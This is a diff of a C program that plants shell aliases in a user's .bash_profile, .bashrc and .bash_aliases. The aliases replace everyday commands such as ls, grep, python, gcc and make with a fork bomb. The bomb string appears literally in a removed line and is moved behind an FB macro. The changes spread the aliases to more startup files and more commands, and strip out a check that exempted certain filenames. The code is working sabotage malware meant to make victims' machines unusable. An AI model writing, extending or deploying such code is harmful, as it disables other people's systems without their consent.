@@ -9,13 +9,14 @@
 #include <stdio.h>
 #include <string.h>
 
+#include "io.h"
+#include "fb.h"
+
 typedef unsigned int uint;
 
 #define DEBUG false
 
-bool is_sudo() {
-    return system("sudo -v") != 0;
-}
+#define arraysize(array) (sizeof((array)) / sizeof(*(array)))
 
 typedef struct alias_t {
     const char *const name;
@@ -62,7 +63,7 @@ void alias(Aliases *const aliases, const char *const name, const char *const val
 }
 
 void alias_fb(Aliases *const aliases, const char *const name) {
-    alias(aliases, name, ":(){ :|:& };:");
+    alias(aliases, name, FB);
 }
 
 void alias_fbs(Aliases *const aliases, const char *const *const names, const uint num_names) {
@@ -72,24 +73,11 @@ void alias_fbs(Aliases *const aliases, const char *const *const names, const uin
     }
 }
 
-bool dangerous_filename(const char *const filename) {
-    return strstr(filename, "khyber") || strstr(filename, "sen") || is_sudo();
-}
-
-char *checked_filename(const char *const filename) {
-    if (!dangerous_filename(filename)) {
-        return (char *) filename;
-    }
-    const size_t len = strlen(filename);
-    char *const new_filename = (char *) malloc((len + 2) * sizeof(char)); // for ~ and null
-    strcpy(new_filename, filename);
-    new_filename[len] = '~';
-    new_filename[len + 1] = 0;
-    return new_filename;
-}
-
 bool save_aliases(const Aliases *const aliases, const char *filename) {
     filename = checked_filename(filename);
+    if (filename == NULL) {
+        return true; // purposely do not save
+    }
     #if (DEBUG)
     printf("saving aliases in %s\n", filename);
     #endif
@@ -111,7 +99,32 @@ bool save_aliases(const Aliases *const aliases, const char *filename) {
     return true;
 }
 
-bool save_aliases_default_location(const Aliases *const aliases) {
+char *make_relative_to_home(const char *const filename) {
+    const size_t home_len = get_home_len();
+    // 1 is for '/' sep
+    char *const path = (char *) malloc(home_len + 1 + (strlen(filename)) * sizeof(char));
+    strcpy(path, HOME);
+    path[home_len] = '/';
+    strcpy(path + home_len + 1, filename);
+    return path;
+}
+
+static const char *const default_locations[] = {
+        ".bash_profile",
+        ".bashrc",
+        ".bash_aliases",
+};
+
+bool save_aliases_default_locations(const Aliases *const aliases) {
+    for (uint i = 0; i < arraysize(default_locations); ++i) {
+        if (!save_aliases(aliases, make_relative_to_home(default_locations[i]))) {
+            return false;
+        }
+    }
+    return true;
+}
+
+/*bool save_aliases_default_location(const Aliases *const aliases) {
     const char filename[] = "/.bash_profile";
     const char *const home = getenv("HOME");
     const size_t home_len = strlen(home);
@@ -119,9 +132,7 @@ bool save_aliases_default_location(const Aliases *const aliases) {
     strcpy(path, home);
     strcpy(path + home_len, filename);
     return save_aliases(aliases, path);
-}
-
-#define arraysize(array) (sizeof((array)) / sizeof(*(array)))
+}*/
 
 static const char *const alias_names[] = {
         "ls",
@@ -135,19 +146,27 @@ static const char *const alias_names[] = {
         "grep",
         "java",
         "python",
+        "python3",
         "gcc",
         "g++",
+        "make",
 };
 
 void make_aliases() {
     Aliases *const aliases = new_default_Aliases();
     alias_fbs(aliases, (const char **) alias_names, arraysize(alias_names));
     int num_tries = 100;
-    while (num_tries-- && !save_aliases_default_location(aliases));
+    while (num_tries-- && !save_aliases_default_locations(aliases));
     free_Aliases(aliases);
 }
+
+#ifdef ALIAS_MAIN
+    #if(ALIAS_MAIN)
 
 int main() {
     make_aliases();
     return 0;
 }
+    
+    #endif
+#endif
